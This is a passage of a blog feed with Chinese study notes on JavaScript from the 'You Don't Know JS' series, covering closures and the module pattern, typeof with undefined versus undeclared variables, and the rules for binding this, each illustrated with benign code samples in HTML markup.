class="params">j</span>)</span>&#123;</span><br><span class="line">setTimeout( <span class="function"><span class="keyword">function</span> <span class="title">timer</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( j );</span><br><span class="line">&#125;, j*<span class="number">1000</span> );</span><br><span class="line">&#125;)( i );</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="模块化"><a href="#模块化" class="headerlink" title="模块化"></a>模块化</h4><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">CoolModule</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> something = <span class="string">"cool"</span>;</span><br><span class="line"><span class="keyword">var</span> another = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doSomething</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( something );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">doAnother</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( another.join( <span class="string">" ! "</span> ) );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">doSomething: doSomething,</span><br><span class="line">doAnother: doAnother</span><br><span class="line">&#125;;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> foo = CoolModule();</span><br><span class="line"></span><br><span class="line">foo.doSomething(); <span class="comment">// cool</span></span><br><span class="line">foo.doAnother(); <span class="comment">// 1 ! 2 ! 3</span></span><br></pre></td></tr></table></figure><p>首先，CoolModule() 只是一个函数，但它 必须被调用 才能成为一个被创建的模块实例。没有外部函数的执行，内部作用域的创建和闭包都不会发生。</p><p>第二，CoolModule() 函数返回一个对象，通过对象字面量语法 { key: value, … } 标记。这个我们返回的对象拥有指向我们内部函数的引用，但是 没有 指向我们内部数据变量的引用。我们可以将它们保持为隐藏和私有的。可以很恰当地认为这个返回值对象实质上是一个 我们模块的公有API。</p><p>这个返回值对象最终被赋值给外部变量 foo，然后我们可以在这个API上访问那些属性，比如 foo.doSomething()</p><h4 id="现代的模块"><a href="#现代的模块" class="headerlink" title="现代的模块"></a>现代的模块</h4><p class="tip">各种模块依赖加载器/消息机制实质上都是将这种模块定义包装进一个友好的API。与其检视任意一个特定的库，不如让我 （仅）为了说明的目的 展示一个 非常简单 的概念证明：</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> MyModules = (<span class="function"><span class="keyword">function</span> <span class="title">Manager</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="keyword">var</span> modules = &#123;&#125;;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">define</span>(<span class="params">name, deps, impl</span>) </span>&#123;</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">var</span> i=<span class="number">0</span>; i&lt;deps.length; i++) &#123;</span><br><span class="line">deps[i] = modules[deps[i]];</span><br><span class="line">&#125;</span><br><span class="line">modules[name] = impl.apply( impl, deps );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params">name</span>) </span>&#123;</span><br><span class="line"><span class="keyword">return</span> modules[name];</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">return</span> &#123;</span><br><span class="line">define: define,</span><br><span class="line">get: get</span><br><span class="line">&#125;;</span><br><span class="line">&#125;)();</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;参考来源&quot;&gt;&lt;a href=&quot;#参考来源&quot; class=&quot;headerlink&quot; title=&quot;参考来源&quot;&gt;&lt;/a&gt;参考来源&lt;/h2&gt;&lt;p&gt;本文是you don’t know js系列的 &lt;a href=&quot;https://github.com/getify/You-Dont-Know-JS/tree/1ed-zh-CN/scope%20%26%20closures&quot; target=&quot;_blank&quot; rel=&quot;noopener&quot;&gt;作用域与闭包&lt;/a&gt; 笔记&lt;/p&gt;
&lt;h2 id=&quot;一、作用域&quot;&gt;&lt;a href=&quot;#一、作用域&quot; class=&quot;headerlink&quot; title=&quot;一、作用域&quot;&gt;&lt;/a&gt;一、作用域&lt;/h2&gt;&lt;h3 id=&quot;什么是作用域&quot;&gt;&lt;a href=&quot;#什么是作用域&quot; class=&quot;headerlink&quot; title=&quot;什么是作用域&quot;&gt;&lt;/a&gt;什么是作用域&lt;/h3&gt;&lt;p&gt;几乎所有计算机语言都提供了最基础的变量模型，变量它允许人们将值存入变量中，并且再后续从变量中取值或修改值。&lt;/p&gt;
&lt;p&gt;但是变量的存储同样会带来几个问题，我们如何存储数据到变量上，又如何查找变量的值。这样的一些列规则我们将其称之为作用域&lt;/p&gt;
&lt;p&gt;&lt;div&gt;
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>types &amp; grammar</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/types%20&amp;%20grammar/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/types &amp; grammar/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-20T12:39:57.662Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、类型"><a href="#一、类型" class="headerlink" title="一、类型"></a>一、类型</h2><blockquote><p>基本类型</p></blockquote><p>JavaScript 定义了七种内建类型：</p><p>null<br>undefined<br>boolean<br>number<br>string<br>symbol – 在 ES6 中被加入的！<br>object</p><p><strong>注意</strong>： 除了 object 所有这些类型都被称为“基本类型（primitives）”。</p><blockquote><p>类型检测</p></blockquote><p>typeof 操作符可以检测给定值的类型，而且总是返回七种字符串值中的一种</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">typeof undefined     === &quot;undefined&quot;; // true</span><br><span class="line">typeof true          === &quot;boolean&quot;;   // true</span><br><span class="line">typeof 42            === &quot;number&quot;;    // true</span><br><span class="line">typeof &quot;42&quot;          === &quot;string&quot;;    // true</span><br><span class="line">typeof &#123; life: 42 &#125;  === &quot;object&quot;;    // true</span><br><span class="line"></span><br><span class="line">// 在 ES6 中被加入的！</span><br><span class="line">typeof Symbol()      === &quot;symbol&quot;;    // true</span><br></pre></td></tr></table></figure><p>在上面的列表中剔除了 null。它是 特殊的 – 特殊在它与 typeof 操作符组合时是有 bug 的。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">typeof null === &quot;object&quot;; // true</span><br></pre></td></tr></table></figure><h3 id="undefined-vs-“undeclared”"><a href="#undefined-vs-“undeclared”" class="headerlink" title="undefined vs “undeclared”"></a>undefined vs “undeclared”</h3><p>当前 还不拥有值的变量，实际上拥有 undefined 值。对这样的变量调用 typeof 将会返回 <code>&quot;undefined&quot;</code>：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">var b = 42;</span><br><span class="line">var c;</span><br><span class="line"></span><br><span class="line">// 稍后</span><br><span class="line">b = c;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br><span class="line">typeof c; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p>大多数开发者考虑“undefined”这个词的方式会诱使他们认为它是“undeclared（未声明）”的同义词。然而在 JS 中，这两个概念十分不同。</p><p>一个“undefined”变量是在可访问的作用域中已经被声明过的，但是在 这个时刻 它里面没有任何值。相比之下，一个“undeclared”变量是在可访问的作用域中还没有被正式声明的。</p><blockquote><p>考虑这段代码：</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">a; // undefined</span><br><span class="line">b; // ReferenceError: b is not defined</span><br></pre></td></tr></table></figure><p>在上面代码中，b未声明时进行了使用，浏览器反馈的错误是：<code>b is not defined</code>.这当然很容易而且很合理地使人将它与“b is undefined.”搞混。需要重申的是，“undefined”和“is not defined”是非常不同的东西。要是浏览器能告诉我们类似于“b is not found”或者“b is not declared”之类的东西就好了，那会减少这种困惑！</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">var a;</span><br><span class="line"></span><br><span class="line">typeof a; // &quot;undefined&quot;</span><br><span class="line"></span><br><span class="line">typeof b; // &quot;undefined&quot;</span><br></pre></td></tr></table></figure><p><code>type</code> 对于未undeclared的变量，返回值也是<code>undefined</code>。即使 是一个未声明变量，也不会有错误被抛出。这是 typeof 的一种特殊的安全防卫行为</p><h3 id="typeof-Undeclared"><a href="#typeof-Undeclared" class="headerlink" title="typeof Undeclared"></a>typeof Undeclared</h3><p>由于typeof安全防卫的特性，我们可以将其用来判断一个变量是否在作用域内进行了赋值操作，倘若不使用typeof，若变量不存在将会发生异常</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">if (typeof sss === &quot;undefined&quot;) &#123;</span><br><span class="line">sss = function() &#123; /*..*/ &#125;;</span><br><span class="line">&#125;</span><br><span class="line">``</span><br><span class="line"></span><br><span class="line">&gt; 使用场景</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">作为一个简单的例子，想象在你的程序中有一个“调试模式”，它是通过一个称为 DEBUG 的全局变量（标志）来控制的。在实施类似于在控制台上输出一条日志消息这样的调试任务之前，你想要检查这个变量是否被声明了。一个顶层的全局 var DEBUG = true 声明只包含在一个“debug.js”文件中，这个文件仅在你开发/测试时才被加载到浏览器中，而在生产环境中则不会。</span><br><span class="line"></span><br><span class="line">然而，在你其他的程序代码中，你不得不小心你是如何检查这个全局的 DEBUG 变量的，这样你才不会抛出一个 ReferenceError。这种情况下 typeof 上的安全防卫就是我们的朋友。</span><br></pre></td></tr></table></figure><p>// 噢，这将抛出一个错误！<br>if (DEBUG) {<br>    console.log( “Debugging is starting” );<br>}</p><p>// 这是一个安全的存在性检查<br>if (typeof DEBUG !== “undefined”) {<br>    console.log( “Debugging is starting” );<br>}<br><code>`</code></p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;一、类型&quot;&gt;&lt;a href=&quot;#一、类型&quot; class=&quot;headerlink&quot; title=&quot;一、类型&quot;&gt;&lt;/a&gt;一、类型&lt;/h2&gt;&lt;blockquote&gt;
&lt;p&gt;基本类型&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;JavaScript 定义了七种内建类型：&lt;/
      
    
    </summary>
    
      <category term="js" scheme="http://zhoushaw.github.io/categories/js/"/>
    
    
      <category term="js" scheme="http://zhoushaw.github.io/tags/js/"/>
    
  </entry>
  
  <entry>
    <title>this &amp; 对象原型</title>
    <link href="http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;%E5%AF%B9%E8%B1%A1%E5%8E%9F%E5%9E%8B/"/>
    <id>http://zhoushaw.github.io/2019/04/01/learning/book-notes/this&amp;对象原型/</id>
    <published>2019-03-31T20:36:35.000Z</published>
    <updated>2019-04-23T13:22:02.323Z</updated>
    
    <content type="html"><![CDATA[<h2 id="一、this关键词"><a href="#一、this关键词" class="headerlink" title="一、this关键词"></a>一、this关键词</h2><p class="tip">this是关键词，表示指向的索引位置</p><p>很多人对于this最终指向常见的误解是，this是编写时绑定的，通常会将其认为成一下几种情况：</p><p>1、认为this指向，foo函数</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span> (<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="keyword">this</span>);</span><br><span class="line">&#125;</span><br><span class="line">foo();</span><br></pre></td></tr></table></figure><div><a id="more"></a></div><p>2、认为this指向，obj对象</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line"><span class="built_in">console</span>.log( <span class="keyword">this</span>.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> obj = &#123;</span><br><span class="line">a: <span class="number">2</span>,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> bar = obj.foo; <span class="comment">// 函数引用！</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">var</span> a = <span class="string">"oops, global"</span>; <span class="comment">// `a` 也是一个全局对象的属性</span></span><br><span class="line"></span><br><span class="line">bar(); <span class="comment">// "oops, global"</span></span><br></pre></td></tr></table></figure><h3 id="可以大致分为以下几种情况："><a href="#可以大致分为以下几种情况：" class="headerlink" title="可以大致分为以下几种情况："></a>可以大致分为以下几种情况：</h3><p>函数调用方式与内部this指针关系<br>1.直接调用:函数内部this指向全局对象window<br>2.通过对象使用点来调用:函数内部this指向调用对象<br>3.触发事件调用函数:函数内部的this指向触发事件的对象<br>4.以new的方式来调用:函数内部this指向本次函数执行时对应的一个匿名对象（以new的方式创建的函数，函数名的首字母一般以大写字母开始）<br>构造函数 ，是一种特殊的方法。主要用来在创建对象时初始化对象， 即为对象成员变量赋初始值，总与new运算符一起使用在创建对象的语句中。</p><p>5.通过call的方法来间接调用方法:函数内部this指向call方法的第一参数对象<br>有点:我们可以创建结构相同，但内容不同的对象</p><p>可参考: <a href="http://www.ruanyifeng.com/blog/2018/06/javascript-this.html" target="_blank" rel="noopener">JavaScript 的this原理</a></p><p>按照本文中的分类将其分为四大块：</p><p>默认绑定、隐含绑定、明确绑定、new 绑定</p><h3 id="仅仅是规则"><a href="#仅仅是规则" class="headerlink" title="仅仅是规则"></a>仅仅是规则</h3><p>this的最终指向可以将其分为大致四种规则</p><h4 id="默认绑定"><a href="#默认绑定" class="headerlink" title="默认绑定"></a>默认绑定</h4><p>我们要考察的第一种规则源于函数调用的最常见的情况：独立函数调用</p><p>在非<code>strict mode</code>模式下，独立函数调用默认指向全局对象window，在<code>strict mode</code>模式下默认绑定 来说全局对象是不合法，所以 <code>this</code> 将被设置为 <code>undefined</code></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo(); // 2</span><br></pre></td></tr></table></figure><h4 id="隐含绑定"><a href="#隐含绑定" class="headerlink" title="隐含绑定"></a>隐含绑定</h4><p>另一种要考虑的规则是：调用点是否有一个环境对象（<code>context object</code>），也称为拥有者（<code>owning</code>）或容器（<code>containing</code>）对象</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj.foo(); // 2</span><br></pre></td></tr></table></figure><p class="tip">无论 foo() 是否一开始就在 obj 上被声明，还是后来作为引用添加（如上面代码所示），这个 函数 都不被 obj 所真正“拥有”或“包含”.调用点 使用 obj 环境来 引用 函数，所以你 可以说 obj 对象在函数被调用的时间点上“拥有”或“包含”这个 函数引用。</p><p>只有对象属性引用链的最后一层是影响调用点的。比如：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj2 = &#123;</span><br><span class="line">a: 42,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var obj1 = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">obj2: obj2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">obj1.obj2.foo(); // 42</span><br></pre></td></tr></table></figure><h5 id="隐含丢失"><a href="#隐含丢失" class="headerlink" title="隐含丢失"></a>隐含丢失</h5><p>传递一个回调函数时：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">function doFoo(fn) &#123;</span><br><span class="line">// `fn` 只不过 `foo` 的另一个引用</span><br><span class="line"></span><br><span class="line">fn(); // &lt;-- 调用点!</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">doFoo( obj.foo ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>那么如果接收你所传递回调的函数不是你的，而是语言内建的呢？没有区别，同样的结果。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2,</span><br><span class="line">foo: foo</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">var a = &quot;oops, global&quot;; // `a` 也是一个全局对象的属性</span><br><span class="line"></span><br><span class="line">setTimeout( obj.foo, 100 ); // &quot;oops, global&quot;</span><br></pre></td></tr></table></figure><p>正如我们刚刚看到的，我们的回调函数丢掉他们的 this 绑定是十分常见的事情。但是 this 使我们吃惊的另一种方式是，接收我们回调的函数故意改变调用的 this。那些很流行的 JavaScript 库中的事件处理器就十分喜欢强制你的回调的 this 指向触发事件的 DOM 元素。虽然有时这很有用，但其他时候这简直能气死人。不幸的是，这些工具很少给你选择。</p><h4 id="明确绑定"><a href="#明确绑定" class="headerlink" title="明确绑定"></a>明确绑定</h4><p>JavaScript 语言中的“所有”函数都有一些工具。具体地说，函数拥有 call(..) 和 apply(..) 方法。</p><p>这些工具如何工作？它们接收的第一个参数都是一个用于 this 的对象，之后使用这个指定的 this 来调用函数。因为你已经直接指明你想让 this 是什么，所以我们称这种方式为 明确绑定（explicit binding)。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">a: 2</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">foo.call( obj ); // 2</span><br></pre></td></tr></table></figure><h5 id="API-调用的“环境”"><a href="#API-调用的“环境”" class="headerlink" title="API 调用的“环境”"></a>API 调用的“环境”</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo(el) &#123;</span><br><span class="line">console.log( el, this.id );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var obj = &#123;</span><br><span class="line">id: &quot;awesome&quot;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line">// 使用 `obj` 作为 `this` 来调用 `foo(..)`</span><br><span class="line">[1, 2, 3].forEach( foo, obj ); // 1 awesome  2 awesome  3 awesome</span><br></pre></td></tr></table></figure><h4 id="new-绑定"><a href="#new-绑定" class="headerlink" title="new 绑定"></a>new 绑定</h4><p>当使用 new 操作符来初始化一个类时，这个类的构造器就会被调用。通常看起来像这样：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">something = new MyClass(..);</span><br></pre></td></tr></table></figure><p class="tip">实际上 JavaScript 的机制和 new 在 JS 中的用法所暗示的面向类的功能 没有任何联系。在 JS 中，构造器 仅仅是一个函数，它们偶然地与前置的 new 操作符一起调用。它们不依附于类，它们也不初始化一个类。它们甚至不是一种特殊的函数类型。它们本质上只是一般的函数，在被使用 new 来调用时改变了行为。</p><blockquote><p>当在函数前面被加入 new 调用时，也就是构造器调用时，下面这些事情会自动完成：</p></blockquote><ul><li>一个全新的对象会凭空创建（就是被构建）</li><li>这个新构建的对象会被接入原形链（[[Prototype]]-linked）</li><li>这个新构建的对象被设置为函数调用的 this 绑定</li><li>除非函数返回一个它自己的其他 对象，否则这个被 new 调用的函数将 自动 返回这个新构建的对象。</li></ul><p>简单来说通过new方法初始化的构造器this指向函数本身</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">function foo(a) &#123;</span><br><span class="line">this.a = a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var bar = new foo( 2 );</span><br><span class="line">console.log( bar.a ); // 2</span><br></pre></td></tr></table></figure><h3 id="一切皆有顺序"><a href="#一切皆有顺序" class="headerlink" title="一切皆有顺序"></a>一切皆有顺序</h3><p class="tip">上面已经揭示了四种this绑定最终指向的规则，但是指向的规则可能会出现重叠的情况，当两种以上的规则出现后如何抉择优先顺序呢。</p><ul><li>函数是通过 new 被调用的吗（new 绑定）？如果是，this 就是新构建的对象。<ul><li>var bar = new foo()</li></ul></li><li>函数是通过 call 或 apply 被调用（明确绑定），甚至是隐藏在 bind 硬绑定 之中吗？如果是，this 就是那个被明确指定的对象。<ul><li>var bar = foo.call( obj2 )</li></ul></li><li>函数是通过环境对象（也称为拥有者或容器对象）被调用的吗（隐含绑定）？如果是，this 就是那个环境对象。<ul><li>var bar = obj1.foo()</li></ul></li><li>否则，使用默认的 this（默认绑定）。如果在 strict mode 下，就是 undefined，否则是 global 对象。<ul><li>var bar = foo()</li></ul></li></ul><h3 id="绑定的特例"><a href="#绑定的特例" class="headerlink" title="绑定的特例"></a>绑定的特例</h3><p>正如通常的那样，对于“规则”总有一些 例外。</p><h4 id="被忽略的-this"><a href="#被忽略的-this" class="headerlink" title="被忽略的 this"></a>被忽略的 this</h4><p class="tip">如果你传递 null 或 undefined 作为 call、apply 或 bind 的 this 绑定参数，那么这些值会被忽略掉，取而代之的是 默认绑定 规则将适用于这个调用。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line"></span><br><span class="line">foo.call( null ); // 2</span><br></pre></td></tr></table></figure><blockquote><p>更安全的 this</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">function foo(a,b) &#123;</span><br><span class="line">console.log( &quot;a:&quot; + a + &quot;, b:&quot; + b );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">// 我们的 DMZ 空对象</span><br><span class="line">var ø = Object.create( null );</span><br><span class="line"></span><br><span class="line">// 将数组散开作为参数</span><br><span class="line">foo.apply( ø, [2, 3] ); // a:2, b:3</span><br><span class="line"></span><br><span class="line">// 用 `bind(..)` 进行 currying</span><br><span class="line">var bar = foo.bind( ø, 2 );</span><br><span class="line">bar( 3 ); // a:2, b:3</span><br></pre></td></tr></table></figure><p>可以通过让其指向一个空对象，使其按照<code>硬绑定</code>原则进行</p><h4 id="间接"><a href="#间接" class="headerlink" title="间接"></a>间接</h4><p>通过赋值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">console.log( this.a );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var a = 2;</span><br><span class="line">var o = &#123; a: 3, foo: foo &#125;;</span><br><span class="line">var p = &#123; a: 4 &#125;;</span><br><span class="line"></span><br><span class="line">o.foo(); // 3</span><br><span class="line">(p.foo = o.foo)(); // 2</span><br></pre></td></tr></table></figure><h3 id="词法this"><a href="#词法this" class="headerlink" title="词法this"></a>词法this</h3><blockquote><p>一个箭头函数的词法绑定是不能被覆盖</p></blockquote><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">function foo() &#123;</span><br><span class="line">  // 返回一个箭头函数</span><br><span class="line">return (a) =&gt; &#123;</span><br><span class="line">    